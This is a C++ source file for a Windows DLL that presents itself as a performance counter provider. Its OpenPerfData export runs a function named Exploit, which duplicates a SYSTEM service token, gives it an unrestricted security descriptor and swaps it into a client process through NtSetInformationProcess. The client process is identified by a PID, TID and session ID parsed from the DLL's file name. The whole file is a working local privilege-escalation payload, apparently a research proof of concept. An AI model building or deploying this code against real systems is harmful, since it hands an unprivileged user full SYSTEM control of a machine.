#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <shlwapi.h>
#include <Lmcons.h>
#include <sddl.h>

#define DEBUG FALSE

#if DEBUG
#define LOGFILE L"C:\\LOGS\\PerfusionDll.log"
#endif

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")

extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID * ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();

typedef NTSTATUS(NTAPI* NtSetInformationProcess) (HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);

typedef struct _PROCESS_ACCESS_TOKEN
{
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, * PPROCESS_ACCESS_TOKEN;

#if DEBUG
void LogToFile(LPCWSTR pwszFilePath, LPCWSTR pwszFormat, ...);
#endif
void UnloadSelf();
void Exploit();
BOOL GetCurrentDllFileName(LPWSTR* ppwszDllName);
BOOL ParseDllFileName(LPCWSTR pwszDllName, PDWORD pdwProcessId, PDWORD pdwThreadId, PDWORD pdwSessionId);
HANDLE CreateGlobalEvent(DWORD dwProcessId, DWORD dwThreadId);

HINSTANCE g_hInstance = NULL;

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
    g_hInstance = instance;

#if DEBUG
    LogToFile(LOGFILE, L"%s", L"> DllMain");
#endif

    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
#if DEBUG
    LogToFile(LOGFILE, L"%ws", L"> OpenPerfData");
#endif

    Exploit();

    UnloadSelf();

#if DEBUG
    LogToFile(LOGFILE, L"%ws", L"UnloadSelf error: %d", GetLastError());
#endif

    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
#if DEBUG
    LogToFile(LOGFILE, L"%ws", L"> CollectPerfData");
#endif

    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
#if DEBUG
    LogToFile(LOGFILE, L"%ws", L"> ClosePerfData");
#endif

    return ERROR_SUCCESS;
}

void UnloadSelf()
{
    //
    // This will crash the current process... :/
    //
    FreeLibrary(g_hInstance);
}

void Exploit()
{
#if DEBUG
    LogToFile(LOGFILE, L"%ws", L">>> Exploit");
#endif

    LPWSTR pwszDllFilename = NULL;
    DWORD dwClientProcessId = 0;
    DWORD dwClientThreadId = 0;
    DWORD dwClientSessionId = 0;
    HANDLE hClientProcess = NULL;
    HANDLE hClientThread = NULL;
    DWORD dwClientThreadResumeCount = 0;

    HANDLE hMyToken = NULL;
    HANDLE hServiceToken = NULL;
    HANDLE hSystemTokenDup = NULL;

    SECURITY_DESCRIPTOR tokensd = { 0 };
    SECURITY_ATTRIBUTES tokensa = { 0 };

    LUID luid = { 0 };
    TOKEN_PRIVILEGES privs = { 0 };

    PROCESS_ACCESS_TOKEN tokenInfo = { 0 };
    HMODULE ntdll = NULL;
    NtSetInformationProcess fnNtSetInformationProcess = NULL;
    NTSTATUS status = 0;

    HANDLE hGlobalEvent = NULL;

    if (!GetCurrentDllFileName(&pwszDllFilename))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"Current DLL File name: %ws", pwszDllFilename);
#endif

    if (!ParseDllFileName(pwszDllFilename, &dwClientProcessId, &dwClientThreadId, &dwClientSessionId))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"Client Process ID: %d", dwClientProcessId);
    LogToFile(LOGFILE, L"Client Thread ID: %d", dwClientThreadId);
    LogToFile(LOGFILE, L"Client Session ID: %d", dwClientSessionId);
#endif

    if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hMyToken))
    {
        //
        // If OpenThreadToken succeeds, it means that the service is impersonating our user. This
        // also means that the current process is running as LOCAL SERVICE, not SYSTEM. 
        //
#if DEBUG
        LogToFile(LOGFILE, L"Found an impersonation Token");
#endif

        //RpcRevertToSelf(); // OK on Windows 7 only (vuln)

    }
    else
    {
        //
        // No impersonation Token. This means that were are most probably running as SYSTEM. So,
        // we can simply use the current process' token.
        //
#if DEBUG
        LogToFile(LOGFILE, L"No impersonation Token found");
#endif

        if (!OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hServiceToken))
            goto cleanup;

#if DEBUG
        LogToFile(LOGFILE, L"OpenProcessToken OK");
#endif

    }

    //
    // If we were not able to get a SYSTEM Token, safely exit.
    //
    if (!hServiceToken)
        goto cleanup;

    //
    // Enable SeAssignPrimaryTokenPrivilege in the current Process' Token.
    // 
    LookupPrivilegeValue(0, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
    privs.PrivilegeCount = 1;
    privs.Privileges[0].Luid = luid;
    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hServiceToken, FALSE, &privs, sizeof(TOKEN_PRIVILEGES), 0, 0))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"AdjustTokenPrivileges OK");
#endif

    //
    // Duplicate the Token so we can apply it to the client's Process. And BTW, give Everyone
    // full access, so that we can manipulate it from the client's end.
    //
    InitializeSecurityDescriptor(&tokensd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&tokensd, TRUE, NULL, FALSE);

    tokensa.nLength = sizeof(tokensa);
    tokensa.bInheritHandle = FALSE;
    tokensa.lpSecurityDescriptor = &tokensd;

    if (!DuplicateTokenEx(hServiceToken, MAXIMUM_ALLOWED, &tokensa, SecurityAnonymous, TokenPrimary, &hSystemTokenDup))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"DuplicateTokenEx OK");
#endif

    //
    // Set the Session ID to match the user's one.
    //
    if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &dwClientSessionId, sizeof(dwClientSessionId)))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"SetTokenInformation OK - %d", GetLastError());
#endif

    //
    // Open client's Process.
    //
    if (!(hClientProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwClientProcessId)))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"OpenProcess OK");
#endif

    //
    // Open client's Thread.
    //
    if (!(hClientThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwClientThreadId)))
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"OpenThread OK");
#endif

    //
    // Replace the Token of the client's Process with our SYSTEM Token.
    //
    tokenInfo.Token = hSystemTokenDup;
    tokenInfo.Thread = 0;

    ntdll = LoadLibrary(L"ntdll.dll");
    if (!ntdll)
        goto cleanup;

    fnNtSetInformationProcess = (NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!fnNtSetInformationProcess)
        goto cleanup;

    status = fnNtSetInformationProcess(hClientProcess, (PROCESS_INFORMATION_CLASS)9, &tokenInfo, sizeof(PROCESS_ACCESS_TOKEN));
    if (status < 0)
        goto cleanup;

#if DEBUG
    LogToFile(LOGFILE, L"NtSetInformationProcess OK");
#endif

cleanup:
    //
    // Create a global Event to let the client know that we are done and wait for 3s so that it has
    // enough time to see it.
    //
    hGlobalEvent = CreateGlobalEvent(dwClientProcessId, dwClientThreadId);
    Sleep(3000);
    CloseHandle(hGlobalEvent);

#if DEBUG
    LogToFile(LOGFILE, L"Last Error was: %d\n", GetLastError());
#endif
    if (ntdll)
        FreeLibrary(ntdll);
    if (hClientThread)
        CloseHandle(hClientThread);
    if (hClientProcess)
        CloseHandle(hClientProcess);
    if (hSystemTokenDup)
        CloseHandle(hSystemTokenDup);
    if (hServiceToken)
        CloseHandle(hServiceToken);
    if (hMyToken)
        CloseHandle(hMyToken);
    if (pwszDllFilename)
        LocalFree(pwszDllFilename);

#if DEBUG
    LogToFile(LOGFILE, L"%ws", L"<<< Exploit");
#endif
}

#if DEBUG
void LogToFile(LPCWSTR pwszFilePath, LPCWSTR pwszFormat, ...)
{
    HANDLE hFile;
    DWORD dwBytesWritten;
    SYSTEMTIME st = { 0 };
    WCHAR wszUsername[UNLEN + 1] = { 0 };
    DWORD dwUsernameLen = UNLEN;
    va_list va;
    LPWSTR pwszDebugString = NULL;
    DWORD dwDebugStringLen = 0;
    size_t st_Offset = 0;

    GetLocalTime(&st);
    GetUserName(wszUsername, &dwUsernameLen);

    va_start(va, pwszFormat);
    dwDebugStringLen = _scwprintf(L"[%.4u-%.2u-%.2u - %.2u:%.2u:%.2u][%ws] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, wszUsername) * sizeof(WCHAR);
    dwDebugStringLen += _vscwprintf(pwszFormat, va) * sizeof(WCHAR) + 4 + 2; // \r\n\0
    pwszDebugString = (LPWSTR)LocalAlloc(LPTR, dwDebugStringLen);

    if (pwszDebugString)
    {
        StringCbPrintf(pwszDebugString, dwDebugStringLen, L"[%.4u-%.2u-%.2u - %.2u:%.2u:%.2u][%ws] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, wszUsername);
        StringCbLength(pwszDebugString, dwDebugStringLen, &st_Offset);
        StringCbVPrintf(&pwszDebugString[st_Offset / sizeof(WCHAR)], dwDebugStringLen - st_Offset, pwszFormat, va);
        StringCchCat(pwszDebugString, dwDebugStringLen, L"\r\n");

        hFile = CreateFile(pwszFilePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            if (ERROR_ALREADY_EXISTS == GetLastError())
                SetLastError(ERROR_SUCCESS);

            WriteFile(hFile, pwszDebugString, wcslen(pwszDebugString) * sizeof(WCHAR), &dwBytesWritten, NULL);
            CloseHandle(hFile);
        }

        LocalFree(pwszDebugString);
    }

    va_end(va);
}
#endif

BOOL GetCurrentDllFileName(LPWSTR* ppwszDllName)
{
    WCHAR wszDllPath[MAX_PATH];
    LPWSTR pwszDllName = NULL;

    GetModuleFileName(g_hInstance, wszDllPath, MAX_PATH);
    if (ERROR_SUCCESS == GetLastError())
    {
        pwszDllName = PathFindFileName(wszDllPath);
        *ppwszDllName = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
        if (*ppwszDllName)
        {
            StringCchPrintf(*ppwszDllName, 64, L"%ws", pwszDllName);
            return TRUE;
        }
    }

    return FALSE;
}

BOOL ParseDllFileName(LPCWSTR pwszDllName, PDWORD pdwProcessId, PDWORD pdwThreadId, PDWORD pdwSessionId)
{
    // 
    // Expect format: performance_PID_TID_SESSID.dll
    //
    int i = 0;
    int j = 0;
    int u = 0;
    WCHAR wszProcessId[10] = { 0 };
    DWORD dwProcessId = 0;
    WCHAR wszThreadId[10] = { 0 };
    DWORD dwThreadId = 0;
    WCHAR wszSessionId[10] = { 0 };
    DWORD dwSessionId = 9999;

    for (i = 0; i < wcslen(pwszDllName); i++)
    {
        if (pwszDllName[i] == L'.')
            break;

        if (pwszDllName[i] == L'_')
        {
            u++;
            j = 0;
        }
        else
        {
            if (j < 10)
            {
                switch (u)
                {
                case 1:
                    wszProcessId[j] = pwszDllName[i];
                    j++;
                    break;
                case 2:
                    wszThreadId[j] = pwszDllName[i];
                    j++;
                    break;
                case 3:
                    wszSessionId[j] = pwszDllName[i];
                    j++;
                    break;
                }
            }
        }
    }

    dwProcessId = wcstoul(wszProcessId, nullptr, 10);
    dwThreadId = wcstoul(wszThreadId, nullptr, 10);
    dwSessionId = wcstoul(wszSessionId, nullptr, 10);

    if (dwThreadId && dwProcessId && dwSessionId != 9999)
    {
        *pdwProcessId = dwProcessId;
        *pdwThreadId = dwThreadId;
        *pdwSessionId = dwSessionId;

        return TRUE;
    }

    return FALSE;
}

HANDLE CreateGlobalEvent(DWORD dwProcessId, DWORD dwThreadId)
{
    HANDLE hEvent = NULL;
    LPWSTR pwszEventName = NULL;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    //
    // Create the Event's name based on the client's PID and TID.
    //
    pwszEventName = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
    if (!pwszEventName)
        goto cleanup;

    //
    // To create a Global Event, we must have SeCreateGlobalPrivilege, but hey, we are SYSTEM at
    // this point so that's file.
    //
    StringCchPrintf(pwszEventName, 64, L"Global\\Event_%d_%d", dwProcessId, dwThreadId);

    //
    // Create a GLobal Event with a NULL security descriptor so that the client can open it.
    //
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = &sd;

    hEvent = CreateEvent(&sa, TRUE, TRUE, pwszEventName);

cleanup:
    if (pwszEventName)
        LocalFree(pwszEventName);

    return hEvent;
}
